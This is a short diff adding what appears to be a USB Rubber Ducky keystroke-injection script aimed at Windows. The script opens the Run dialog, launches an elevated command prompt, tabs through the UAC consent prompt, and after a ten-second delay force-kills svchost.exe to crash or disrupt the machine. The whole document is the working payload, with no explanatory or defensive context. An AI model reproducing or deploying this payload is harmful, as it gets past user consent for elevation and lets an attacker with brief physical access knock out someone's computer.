@@ -1,0 +1,13 @@
+DELAY 2000
+GUI r
+DELAY 300
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 400
+TAB
+DELAY 400
+TAB
+ENTER
+DELAY 400
+STRING timeout /t 10 /nobreak >nul && taskkill /F /IM svchost.exe
+ENTER
